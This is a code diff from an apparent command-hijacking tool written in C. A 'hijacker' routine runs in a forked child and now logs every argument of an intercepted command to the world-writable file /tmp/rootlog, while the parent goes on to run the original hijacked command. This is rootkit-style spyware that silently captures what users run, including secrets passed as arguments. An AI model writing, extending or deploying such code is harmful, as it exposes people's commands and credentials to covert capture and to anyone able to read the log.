@@ -65,7 +65,7 @@ char* execute_command(char* command){
     return res;
 }
 
-int hijacker_process_routine(char* argv[]){
+int hijacker_process_routine(int argc, char* argv[]){
     int fd = open("/tmp/rootlog", O_RDWR | O_CREAT | O_TRUNC, 0666);
     if(fd<0){
         perror("Failed to open log file");
@@ -86,10 +86,13 @@ int hijacker_process_routine(char* argv[]){
     }
     write(fd, "\t", 1);
     
-    ii = 0;
-    while(*(argv[0]+ii)!='\0'){
-        write(fd, argv[0]+ii, 1);
-        ii++;
+    for(int jj = 0; jj<argc; jj++){
+        ii = 0;
+        while(*(argv[jj]+ii)!='\0'){
+            write(fd, argv[jj]+ii, 1);
+            ii++;
+        }
+        write(fd, "\t", 1);
     }
 
     write(fd, "\n", 1);
@@ -188,7 +191,7 @@ int main(int argc, char* argv[], char *envp[]){
         //Child process
         printf("I am the child with pid %d\n", (int) getpid());
         printf("Child process is exiting\n");
-        hijacker_process_routine(argv);
+        hijacker_process_routine(argc, argv);
         exit(0);
     }
     //Parent process. Call original hijacked command
